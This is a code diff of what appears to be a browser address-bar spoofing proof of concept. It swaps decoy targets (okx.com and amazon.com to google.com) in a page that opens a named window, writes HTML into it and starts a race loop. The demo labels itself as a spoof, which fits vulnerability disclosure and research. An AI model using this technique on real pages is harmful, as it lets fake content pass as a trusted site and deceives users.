@@ -3,7 +3,7 @@
 </head>
 
 <body>
-    <a href="javascript:window.open('https://www.okx.com/','x');" onclick="startSpoof()">Spoof</a>
+    <a href="javascript:window.open('https://www.google.com/','x');" onclick="startSpoof()">Spoof</a>
 </body>
     
     <script>
@@ -22,7 +22,7 @@
     function startSpoof() {
 
       windowSpoof = window.open("https://www.google.com:82","x");
-      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
+      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.google.com/</h2>");
 
       setInterval('race()', 0);
     
